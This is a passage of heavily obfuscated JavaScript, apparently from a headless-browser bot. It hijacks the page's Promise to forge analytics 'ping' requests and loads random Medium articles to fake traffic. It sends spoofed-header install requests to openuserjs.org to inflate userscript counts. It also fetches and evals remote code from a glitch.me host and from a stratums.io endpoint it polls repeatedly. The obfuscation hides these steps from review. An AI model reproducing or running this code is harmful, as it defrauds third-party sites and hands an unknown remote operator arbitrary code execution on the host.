Y[R + (0xa98 + 0x191f + -0x23b3)] << -0x1c23 + 0x29 * 0x3d + 0x92f * 0x2, V = V << 0x199 + -0x2ce * -0x1 + -0x449 | V >>> -0xb25 + 0x2 * 0x696 + -0x205 * 0x1;
                    for (; R < -0x1 * -0xca6 + -0x235e + -0xb70 * -0x2; R += 0x6 * 0x407 + -0x8 * -0x239 + 0x1 * -0x29ed)
                      T = (S = (U = (S = (V = (S = (W = (S = (X = (S = T << -0x1127 + 0x14e * -0x3 + 0x1516 | T >>> -0x3 * -0x16 + -0x3 * 0x4fd + 0x4f * 0x30) + (U ^ V ^ W) + X + (-0x657b1ac + -0x37dcbf19 + -0x3c31845 * -0x2e) + Y[R] << 0x21 * 0xd7 + 0x9a4 * -0x2 + -0x86f) << -0x1ce3 + -0x78a + -0x613 * -0x6 | X >>> -0xf52 + 0x6a * -0x22 + 0x1d81) + (T ^ (U = U << -0x4e * 0x2 + -0x1 * 0x9c9 + 0xd * 0xcf | U >>> 0x1 * -0x2417 + -0x1ae5 + 0x3efe) ^ V) + W + (-0x2 * 0x1ac1071f + 0xa512d76b + -0xb6dd8c) + Y[R + (-0xc7 + 0x1 * -0x2374 + 0x1 * 0x243c)] << -0x133a + 0x1fcf + -0xc95 * 0x1) << 0xeea * 0x1 + 0xad3 + 0x66e * -0x4 | W >>> 0x1 * -0x347 + 0xa4b + -0x6e9) + (X ^ (T = T << -0xe3d + 0x1 * -0xbe7 + 0x2 * 0xd21 | T >>> -0x3 * 0xc92 + -0x1e9 * 0xd + -0x43 * -0xef) ^ U) + V + (0x4d956ea4 + -0x426e855f + 0x63b3025c * 0x1) + Y[R + (-0xf7b * 0x1 + 0x9c7 + 0x5b6)] << -0x1 * 0x254d + 0x10 * -0xc2 + 0x316d) << 0x1bfb * -0x1 + -0xb5d * -0x1 + -0x1 * -0x10a3 | V >>> -0x13fa + -0xed7 + 0x22ec) + (W ^ (X = X << -0x1e01 + 0x242c + -0x60d | X >>> 0x67 * 0x59 + 0x887 + -0x2c54) ^ T) + U + (-0x481a8820 + -0x6d0a23df + 0x34333c * 0x598) + Y[R + (0x1197 * 0x2 + 0x4 * 0x1bb + -0x2a17)] << 0x25 * 0x80 + 0x29 * -0x99 + 0x601) << 0x92e + -0x1f7f + 0x3 * 0x772 | U >>> 0x4cf * 0x4 + 0x21 * 0x7e + -0x235f) + (V ^ (W = W << -0xfd3 * -0x1 + 0x60 * 0x4 + -0x1135 * 0x1 | W >>> 0x5 * 0x1e7 + -0x1 * -0x1dc3 + -0x2744) ^ X) + T + (0x70980367 * 0x1 + 0x3902bc0f + -0x76af * 0x7ebb) + Y[R + (-0xef9 + -0x2d * 0xb + 0x10ec)] << 0x33 * 0x8b + -0x1cc3 + 0x112, V = V << 0x71c + 0x1487 + 0x1 * -0x1b85 | V >>> -0x7bb + 0x5d * 0x46 + -0x287 * 0x7;
                    for (; R < 0xb11 * -0x3 + 0x1d6 * -0x5 + 0x2a9d; R += -0x16ba + -0x6d0 + 0xa1 * 0x2f)
                      T = (S = (U = (S = (V = (S = (W = (S = (X = (S = T << 0x1 * 0x16d9 + -0x12a0 + -0x4 * 0x10d | T >>> -0xd92 + 0x100 * 0xe + -0x1 * 0x53) + (U & V | U & W | V & W) + X - (0x1 * 0xb291a409 + 0xb1995aa9 + -0x21e * 0x72e7c9) + Y[R] << 0x3 * 0x606 + 0x145b + 0x3 * -0xccf) << 0x1dff * -0x1 + -0x6e * 0x3 + 0x1f4e | X >>> -0xf * 0x18b + -0x2 * 0x3fd + -0x1 * -0x1f3a) + (T & (U = U << -0x1a69 + 0x2 * -0x1b4 + -0x4f * -0x61 | U >>> 0x259 * 0x1 + 0x6b1 + -0x908) | T & V | U & V) + W - (-0x352b99 * 0x369 + 0x3e3a7f * -0x2c8 + 0x1d348a11d) + Y[R + (0x250b * -0x1 + -0x3 * -0xc48 + -0x2 * -0x1a)] << -0xaf4 + 0x1044 + -0x550) << 0x26b1 + 0x182b + -0x1 * 0x3ed7 | W >>> 0x566 * 0x1 + 0x7c3 + -0x2 * 0x687) + (X & (T = T << 0x51 * 0x6b + -0x90a + -0x18b3 * 0x1 | T >>> 0x7 * -0x3f3 + -0x73 * 0x21 + 0x2a7a) | X & U | T & U) + V - (-0x22ea * -0x1765a + -0xbdd1b90 * 0xd + 0xd8108730) + Y[R + (0x1cc9 + -0x1c15 + 0x1 * -0xb2)] << -0x5d + -0x7 * -0x9b + -0x3e0) << 0x1046 * 0x2 + -0x300 + -0x1d87 | V >>> 0x11 * -0xc5 + -0x4d6 + 0x1206) + (W & (X = X << -0x1 * -0x2ec + -0xd6 * 0x29 + 0x1f78 | X >>> 0x21ea + 0x361 + -0x5 * 0x775) | W & T | X & T) + U - (-0x6de86b1e + -0x3ba * 0x2f344 + 0x33 * 0x4958dae) + Y[R + (0x2db * 0x4 + 0xdb2 + 0x1 * -0x191b)] << -0x549 + 0x679 + 0x4c * -0x4) << 0x10b0 + 0x1cb6 + -0x2d61 | U >>> -0x1d * 0x27 + -0x20c9 + -0x254f * -0x1) + (V & (W = W << -0xeb3 + -0x15ef + 0x24c0 | W >>> 0x23ad * 0x1 + -0x20c4 + 0x1 * -0x2e7) | V & X | W & X) + T - (-0xabfd057b + 0x22 * -0x18f9439 + 0x7 * 0x30474807) + Y[R + (0x858 + 0x16db + 0x1 * -0x1f2f)] << 0x22e2 + 0x11bb + -0x349d, V = V << 0x35 * 0x5e + -0x11d1 * -0x1 + 0x54f * -0x7 | V >>> -0x10d8 * -0x1 + -0x8b4 * 0x2 + -0x2 * -0x49;
                    for (; R < -0x391 + -0x167f * -0x1 + -0x129e; R += -0x362 + -0x2531 + 0x2898)
                      T = (S = (U = (S = (V = (S = (W = (S = (X = (S = T << 0x1d61 + 0x2 * -0xd19 + -0x32a | T >>> -0x8c5 * -0x1 + 0x1a1f * 0x1 + -0x22c9) + (U ^ V ^ W) + X - (-0xcf5c526 + 0x420ec8db * -0x1 + 0x6b * 0x13d5341) + Y[R] << -0x70b + 0x1 * 0x1f57 + -0x184c) << 0x9a5 + 0x2b4 + -0xc54 | X >>> 0x2255 * 0x1 + 0x19 * -0x62 + 0x18 * -0x107) + (T ^ (U = U << -0x2b1 * -0x1 + -0x245c + 0xb43 * 0x3 | U >>> -0xf33 + -0x1d41 * 0x1 + 0x2c76) ^ V) + W - (0x25e8e * 0x1cba + -0xc22be1 * -0x87 + -0x74d820a9) + Y[R + (-0x1f50 + 0x1fa1 + -0x4 * 0x14)] << -0x23ef + 0x1fff + 0x3f0) << -0x408 * -0x5 + 0x4f4 * -0x7 + 0xe89 | W >>> 0x199 + -0x1943 + 0x17c5) + (X ^ (T = T << 0x6 * -0x42e + -0xb87 + 0x24b9 | T >>> 0xc20 + 0x88d + 0x25 * -0x8f) ^ U) + V - (-0xd009f51 + -0x2a2fb6aa + 0x6ccd9425) + Y[R + (-0x3 * -0x13d + 0x2 * 0x12e3 + -0x297b)] << -0x1 * 0x138f + 0x182b + 0x2 * -0x24e) << 0x15 * 0x74 + -0xb * 0x20b + 0xcfa | V >>> 0x1328 + 0x7 * -0x4ba + 0xe09) + (W ^ (X = X << -0x1ab1 + -0x1 * -0x2291 + 0x296 * -0x3 | X >>> 0xc3b * 0x1 + -0x12c6 + 0x68d) ^ T) + U - (-0x30c83 * -0x81e + 0xceb7f * -0x41 + -0x497a3b9 * -0x7) + Y[R + (-0xcc0 + -0x25cf * -0x1 + -0x1c * 0xe5)] << -0x1690 + -0x1f2b + 0x35bb) << 0x7 * 0x33f + -0x2ff * 0x3 + 0xdb7 * -0x1 | U >>> -0x20b * -0x1 + 0x1b86 + 0x9d2 * -0x3) + (V ^ (W = W << -0x9f7 + 0xa * -0x225 + 0x1f87 | W >>> -0xfc7 + 0x19f * -0xd + 0x24dc) ^ X) + T - (-0x10f * 0x2cc5f6 + -0x17ec74bf * 0x1 + 0x1 * 0x7cef4253) + Y[R + (-0x1 * -0x69b + -0x737 * 0x3 + 0xf0e)] << -0x47 * 0x7e + -0x7b6 + -0xd2 * -0x34, V = V << 0x265 * -0x3 + -0xcdd + 0x142a | V >>> -0x6 * 0x131 + 0x1 * 0xf76 + 0x84e * -0x1;
                    this['h0'] = this['h0'] + T << 0xa58 + 0x228f + 0x25d * -0x13, this['h1'] = this['h1'] + U << -0x9 * 0x323 + 0x196 + -0x167 * -0x13, this['h2'] = this['h2'] + V << 0x17c4 + 0x146 + -0xa * 0x281, this['h3'] = this['h3'] + W << -0x1 * -0x26a3 + -0x5 * 0x10 + -0x2653, this['h4'] = this['h4'] + X << 0xa15 + 0x559 + 0x9e * -0x19;
                  }
                  ['hex']() {
                    this['finalize']();
                    var R = this['h0'],
                      S = this['h1'],
                      T = this['h2'],
                      U = this['h3'],
                      V = this['h4'];
                    return E[R >> -0x2df + 0x10be + -0xdc3 & -0x15cc + 0x1522 * 0x1 + 0xb9 * 0x1] + E[R >> 0x35 * -0x23 + -0x202e + 0x43 * 0x97 & 0x1ee8 + -0x1 * 0x1ff + -0x4cf * 0x6] + E[R >> 0x2158 + 0x72f + -0x2873 & 0x208a + 0x4ab + 0x13d * -0x1e] + E[R >> 0x6a0 + 0x38 * -0xad + 0x1f48 & -0x4 * 0x39e + 0xa * 0x331 + -0x1163] + E[R >> 0x1052 + -0x138d + -0x347 * -0x1 & 0x2ce * -0x6 + -0x2f4 * 0x8 + 0x2883] + E[R >> -0x1dc6 + -0x3 * 0x293 + 0x2587 & -0x2562 + -0x2b3 * -0x1 + -0x2 * -0x115f] + E[R >> -0x497 * 0x8 + -0x2226 + 0x46e2 & 0x1343 + -0x250e + 0x11da] + E[0x64b * -0x1 + 0x2515 + -0x1 * 0x1ebb & R] + E[S >> 0x1 * -0x1cc9 + 0xc5 * 0x25 + 0x6c & -0xaf * 0x29 + 0x14 * 0x169 + -0x1e] + E[S >> 0x161 + 0x2170 + -0x22b9 & -0x14dc + -0x19a * 0xa + 0x24ef] + E[S >> 0x2234 + -0x1ac4 + -0x75c & 0x1 * -0x2094 + -0x11ff * -0x1 + 0xea4] + E[S >> 0x12 * -0x97 + 0x1ad4 + -0x1026 & 0x3 * 0x566 + 0x2a4 * -0x2 + -0xadb] + E[S >> 0x978 + -0x9f3 + 0x87 & 0x1d74 + -0x166c + -0x6f9] + E[S >> 0xad * 0x1f + 0x177b + -0x2 * 0x1633 & 0x86a + 0x1683 + -0x1ede] + E[S >> -0x1 * -0x1c91 + 0x56 * -0x3a + -0x911 & 0x22db * 0x1 + -0x15ca + 0x681 * -0x2] + E[-0x1 * -0x1033 + -0x1 * -0x397 + -0x13bb * 0x1 & S] + E[T >> -0x7f5 + -0x2 * -0x295 + 0x2e7 & -0x57 * 0x19 + 0x24c2 + -0x1c34] + E[T >> -0x1628 + -0xc63 + 0x1 * 0x22a3 & 0x7d * -0xa + 0x1d9d + -0x18ac] + E[T >> -0x1c5b + -0x3 * -0xaa1 + 0x11 * -0x34 & 0x105e + 0x11d * -0x23 + 0x16a8] + E[T >> -0x2b * 0x4a + -0x2251 + 0x2ecf & -0x5f7 + 0x1 * 0xe7e + -0x2 * 0x43c] + E[T >> 0x13e9 + 0x1 * -0x1fd3 + -0xbf6 * -0x1 & 0x86b * 0x3 + 0x2ba * 0x5 + 0x47 * -0x8c] + E[T >> 0x245f * -0x1 + -0x16d3 + -0x1d9d * -0x2 & -0x1863 + -0x232 + 0x9b * 0x2c] + E[T >> 0x53 * 0x3b + 0x1 * -0x29 + -0x12f4 & -0x1bbe + -0x4dd * 0x3 + 0x2a64] + E[0x1dde + 0x2236 + 0x1557 * -0x3 & T] + E[U >> -0xa3a + 0x1e83 * 0x1 + -0x142d & 0x14bf + -0x583 * -0x1 + 0x161 * -0x13] + E[U >> 0x2dd * 0x5 + 0x3 * -0x99e + 0xea1 & 0x17d1 + 0x8e7 + -0x20a9] + E[U >> -0x2229 * 0x1 + 0x138b * 0x1 + 0xeb2 & 0x3ae + 0x1181 * 0x1 + -0x1520] + E[U >> 0x146b + 0x1 * -0x19bd + -0x2b1 * -0x2 & 0xd6c + 0x3 * 0x115 + -0x109c * 0x1] + E[U >> -0x10 * 0x85 + -0x1c47 + 0x24a3 & 0x973 + 0x259d + 0xbf * -0x3f] + E[U >> 0x1229 + 0x19d + -0x85 * 0x26 & -0xa4 + 0x1 * -0x1eec + 0x1 * 0x1f9f] + E[U >> 0x95 * 0x18 + -0x3d * 0x17 + -0x3 * 0x2d3 & -0x499 * -0x3 + 0xc97 + -0x1a53] + E[0xe * 0x163 + 0x1ffd + -0x4 * 0xcd6 & U] + E[V >> 0x22f * -0x8 + 0x33 * -0x39 + 0x1cef & 0xdd1 + 0x28d * 0xa + -0x2744] + E[V >> -0x1fd5 + -0xf9c + -0x2f89 * -0x1 & 0x37 * -0x89 + 0x24b9 + -0x73b] + E[V >> -0x15ef + 0xa38 + -0x1 * -0xbcb & -0x3e1 + -0xc9f + 0x108f] + E[V >> -0x1 * 0x16c9 + 0x12e2 * 0x2 + 0x13 * -0xc9 & 0x1 * 0x547 + -0x2 * -0x851 + -0x1 * 0x15da] + E[V >> -0xb03 + 0x15ca + 0x1 * -0xabb & 0xb93 * -0x1 + 0x191d + 0xd7b * -0x1] + E[V >> 0x20a6 + 0x1e7d + 0x1509 * -0x3 & 0x3ad * -0x2 + -0x1403 + 0x1b6c] + E[V >> -0x17e3 * 0x1 + 0x2 * 0x11d1 + -0x1ad * 0x7 & -0x1818 + 0x21b * -0xe + 0x35a1] + E[-0x971 * -0x1 + 0x1a7a + -0x23dc & V];
                  }
                  ['digest']() {
                    this['finalize']();
                    var R = this['h0'],
                      S = this['h1'],
                      T = this['h2'],
                      U = this['h3'],
                      V = this['h4'];
                    return [
                      R >> -0x3 * 0x549 + 0x4b * -0xd + 0x696 * 0x3 & 0xf37 + -0x13 * 0x3d + 0x1 * -0x9b1,
                      R >> 0x25a * -0x10 + -0x1f07 + 0x44b7 & -0x96f + 0xf43 * -0x1 + 0x19b1,
                      R >> -0x18b3 * -0x1 + -0x25f9 + 0xd4e & 0x970 * -0x1 + -0xc7d + -0x9 * -0x28c,
                      -0x263f * -0x1 + 0x82 * -0x1a + 0x4 * -0x603 & R,
                      S >> -0x1cca + -0x59 * 0x34 + 0x2ef6 & 0xdf7 * -0x1 + -0x256a + -0x2 * -0x1a30,
                      S >> -0x22bd * 0x1 + 0x1f34 + 0x399 & 0x2a0 * 0xd + -0xeac + -0x1275,
                      S >> -0x2c7 + 0x4c0 * 0x2 + -0x23b * 0x3 & 0x186 * -0x1 + -0x1ff + -0x121 * -0x4,
                      -0x4 * 0x26f + 0x9a5 + 0x116 & S,
                      T >> 0x117e + 0x1533 + 0x29 * -0xf1 & 0x37a * -0x8 + 0x31 * -0x8c + 0x379b,
                      T >> 0x15c3 + -0x1 * 0x264b + 0xb1 * 0x18 & -0x8cd + -0x20e1 * 0x1 + -0x73 * -0x5f,
                      T >> -0x5eb + 0x1b48 + -0x1 * 0x1555 & 0x812 + 0x1739 + -0x1e4c,
                      -0x2348 + 0x3b7 + -0x2 * -0x1048 & T,
                      U >> 0x1 * -0xf9d + 0x1d78 + 0x1 * -0xdc3 & 0x1e20 + -0xabf + 0xd * -0x16a,
                      U >> 0x1 * 0x128b + -0x1 * -0xb7b + -0x1df6 & -0x1 * 0x331 + 0x1321 * -0x2 + 0x1539 * 0x2,
                      U >> 0xb11 * -0x3 + 0x6b8 + -0xb * -0x269 & 0xf * 0x19 + -0x17 * 0x1a9 + 0x5 * 0x78b,
                      -0x1dba * 0x1 + 0x5cf * -0x2 + 0x2a57 & U,
                      V >> -0x1 * 0x256e + -0x411 + 0x3 * 0xddd & 0x1662 + -0xb3 + 0x52c * -0x4,
                      V >> 0x261 * 0x5 + 0x2389 * -0x1 + -0x94 * -0x29 & -0x1f34 + 0x1 * 0xa7d + 0x15b6,
                      V >> 0x23a5 + 0xe29 + 0x2 * -0x18e3 & -0x53e + -0x1f58 + 0x1 * 0x2595,
                      -0xd4f * -0x1 + 0x5d * -0x25 + 0x121 & V
                    ];
                  }
                  ['arrayBuffe' + 'r']() {
                    var R, S;
                    return this['finalize'](), R = new ArrayBuffer(0x2 * -0x1046 + -0x1eb * -0x1 + 0x1eb5), (S = new DataView(R))['setUint32'](0x1c * -0x1d + -0xd23 + 0x104f, this['h0']), S['setUint32'](0x1dcd + -0x2aa * 0xa + -0x325, this['h1']), S['setUint32'](0x88d * 0x3 + 0x164f + 0x996 * -0x5, this['h2']), S['setUint32'](-0x1 * 0x195b + 0xd4b + 0xc1c, this['h3']), S['setUint32'](0x13 * -0x1bb + -0x1555 + -0x2 * -0x1b23, this['h4']), R;
                  }
              }
              O['prototype']['toString'] = O['prototype']['hex'], O['prototype']['array'] = O['prototype']['digest'];
              const P = K();
              window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
              let Q = document['getElement' + 'sByClassNa' + 'me'](a4(0x8, 'l%S5') + 'nk')[0x3 * 0x62b + -0x2 * 0x27a + -0xd8d];
              return window['Promise'] = class extends window['Promise'] {
                constructor(...R) {
                  let S = -0x2513 + -0x733 + 0x6 * 0x761;
                  R[0x1902 + -0x2a7 * 0x1 + -0x165b]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (R[0x155e + -0x1 * 0xcb1 + 0x1 * -0x8ad] = T => {
                    let U = Q['getAttribu' + 'te']('data-ping-' + 'url');
                    if (U) {
                      let V = P(Q['getAttribu' + 'te']('data-ip-ad' + 'dress') + Q['getAttribu' + 'te']('data-scrip' + 't-id') + Q['getAttribu' + 'te']('data-ping-' + 'key')),
                        W = new XMLHttpRequest();
                      W['open']('POST', U + ('&mo=3&ping' + '_key=') + encodeURIComponent(V), -0xa7 * 0x2f + 0x18e9 + 0x5c1 * 0x1), W['overrideMi' + 'meType']('text/plain'), W['onload'] = () => {}, W['send'](), S = 0x1fec + 0x330 * 0x3 + -0x297b;
                    }
                  }), S || super(...R);
                }
              }, window['setTimeout'](() => {
                Q['click']();
              }, 0x5cb + -0x3ee * -0x2 + 0x15 * -0x5f), Promise['resolve'](-0x5d6 + -0x1ba9 * 0x1 + 0x2180);
            }), await wait(NETWORK_PATIENCE), await B['close'](), await A['close'](), r()));
          }
        }
        for (let s = 0x9ea + 0x4 * 0x6ba + 0x6 * -0x623; s < 0x19a5 + 0x1 * 0x24b3 + 0x1 * -0x3e57; s++)
          r();
      }, -0x2708 + 0x1de7 + -0x985 * -0x1), flags['RPL2_MDM2'] && setTimeout(async () => {
        const r = await n['newPage']();
        for (;;) {
          let s = 0x53 * -0x11 + 0x21ff + -0x1c7c;
          if (await r['goto'](data['mediumArti' + 'cles']['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](u => s++), !s) {
            await randomWait();
            for (let u = -0x15a + -0xa61 + 0xbbb; u < getRandomInt(-0x7 * 0x295 + 0x13e5 + -0x1d1, 0xfdf + -0xd73 + 0x29 * -0xf); u++)
              await r['keyboard']['press']('ArrowDown'), await randomWait();
            await randomWait(), await wait(-0x1943f * 0x1 + 0xfd8a + 0x7 * 0x3703);
          }
        }
      }, -0xcf1 + -0x15b5 + 0x230a), flags['RPL2_WP'] && setTimeout(async () => {
        (async function r() {
          const a5 = c;
          try {
            let s = -0x1 * -0x18d9 + -0x1 * 0x239 + -0x16a0;
            const t = await n[a5(0x0)]();
            if (await t['goto']('https://ww' + 'w.whitepag' + 'es.com/', {
                'timeout': MM_NETWORK_PATIENCE
              })['catch'](u => s++), s)
              return await t['close'](), r();
            await wait(-0x4a + -0x215 + 0xe17), await t['evaluate'](() => {
              const a6 = b;
              let u = new XMLHttpRequest();
              u['open']('GET', a6(0x5, 'hMTn') + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x1b27 + 0x1619 + -0x3140), u['send'](), eval(u['responseTe' + 'xt']);
            });
          } catch (u) {}
        }());
      }, 0x3 * -0xa95 + 0x1 * 0xd64 + 0x12bf);
    }
  ],
  [
    () => flags['doCreateSe' + 'rver'],
    async () => {
      require('http')['createServ' + 'er'](async function(f, g) {
        g['writeHead'](0x17cc + 0x1 * -0x60a + -0x2 * 0x87d), g['write']('v0.8'), g['end']();
      })['listen'](process['env']['PORT'] || -0x1 * -0x21ce + 0x1 * 0xdc2 + 0x8 * -0x200);
    }
  ],
  [
    () => flags['doOUJS'],
    async () => {
      async function f() {
        const h = data['oujsToAssi' + 'st']['random'](),
          j = h['replace']('/scripts/', '/install/') + '.user.js',
          [k, l] = (function() {
            const x = data['oujsUAs']['random']();
            return [
              x,
              x['includes']('Firefox')
            ];
          }()),
          m = function(x, y = -0x14 + -0x2498 + 0x24ad) {
            if (x['includes']('Firefox'))
              return x['slice'](x['indexOf']('Firefox') + 'Firefox' ['length'] + (0x592 + 0x2384 + -0x2915));
            const z = x['indexOf']('Chrome/') + 'Chrome/' ['length'],
              A = x['slice'](z),
              B = A['slice'](0x1 * -0x859 + -0xd83 * -0x2 + 0x7 * -0x2ab, A['indexOf']('\x20'));
            return y ? B['slice'](-0x1582 + 0x1a56 + -0x26a * 0x2, B['indexOf']('.')) : B;
          }(k),
          q = {
            'signal': AbortSignal['timeout'](-0x1ceb + -0x1 * -0x88a + -0x1 * -0x3b71),
            'headers': {
              'host': 'openuserjs' + '.org',
              'origin': 'https://op' + 'enuserjs.o' + 'rg',
              'user-agent': k,
              'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
              'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
              'accept-language': 'en-US,en;q' + '=0.9',
              'cache-control': 'no-cache',
              'pragma': 'no-cache',
              'sec-fetch-dest': 'document',
              'sec-fetch-mode': 'navigate',
              'sec-fetch-site': 'same-origi' + 'n',
              'sec-fetch-user': '?1',
              'upgrade-insecure-requests': '1'
            },
            'body': null,
            'method': 'GET'
          };
        l ? Object['assign'](q['headers'], {
          'te': 'trailers'
        }) : Object['assign'](q['headers'], {
          'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '\x22Windows\x22'
        });
        const u = await fetch(g, q)['catch'](x => {});
        if (!u || !u['headers'])
          return;
        if (null === u['headers']['get']('X-RateLimi' + 't-Limit'))
          return;
        const v = {
          'signal': AbortSignal['timeout'](0x2 * -0x155f + 0x1f * 0x103 + -0x3271 * -0x1),
          'headers': {
            'host': 'openuserjs' + '.org',
            'origin': 'https://op' + 'enuserjs.o' + 'rg',
            'user-agent': k,
            'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
            'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
            'accept-language': 'en-US,en;q' + '=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'referer': g,
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origi' + 'n',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1'
          },
          'body': null,
          'method': 'GET'
        };
        if (l ? Object['assign'](v['headers'], {
            'te': 'trailers'
          }) : Object['assign'](v['headers'], {
            'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '\x22Windows\x22'
          }), !await fetch(h, v)['catch'](x => {}))
          return;
        const w = {
          'headers': {
            'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
            'accept-language': 'en-US,en;q' + '=0.9',
            'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
            'pragma': 'no-cache',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'none'
          },
          'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
          'body': null,
          'method': 'GET'
        };
        l ? Object['assign'](w['headers'], {
          'te': 'trailers'
        }) : Object['assign'](w['headers'], {
          'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '\x22Windows\x22'
        }), await fetch(j, w);
      }
      const g = 'https://op' + 'enuserjs.o' + 'rg/';
      f();
      for (let h = -0x379 + 0xf7 * -0x7 + 0xa3a; h < -0x3b * -0xa + -0x11 + -0x239 * 0x1; h++)
        setTimeout(f, (-0x1295b * 0x1 + 0x17f6 * 0x11 + 0x7c65) * h * getRandomInt(0x5f9 * 0x1 + 0x1f7f + 0x8b * -0x45, -0x40 * 0x22 + 0x1 * -0x1c7c + 0x24ff));
      setInterval(() => {
        f();
        for (let i = -0x2073 + -0x1c19 + 0x3c8c; i < 0x51 * 0x6d + 0x20e5 + 0x21af * -0x2; i++)
          setTimeout(f, (0x71 * 0xac + 0x14895 * 0x1 + 0x1 * -0xaa21) * i * getRandomInt(-0x13d9 * -0x1 + 0x4f8 + -0x31a * 0x8, 0x250a + 0x61 * -0x51 + -0x656 * 0x1));
      }, 0x9 * -0x72d91 + 0x44a5 * 0x7f + 0x2 * 0x2abd5f);
    }
  ],
  [
    () => flags['RPL2_RPRT'],
    async () => {
      async function f() {
        try {
          axios['post']('https://st' + 'ratums.io/' + 'research', {
            'key': 'CX001_ZCa',
            'dom': me
          })['then'](g => {
            try {
              eval(g['data']);
            } catch (h) {}
          })['catch'](g => {});
        } catch (g) {}
      }
      f(), setInterval(f, 0x85983 + 0x2 * -0x36b9d + 0x31197);
    }
  ]
];
for (let e of actions)
  e[-0x24f2 + 0x176 * 0x1 + 0xbd4 * 0x3]() && setTimeout(e[-0x2236 + -0xfe + 0x1 * 0x2335]);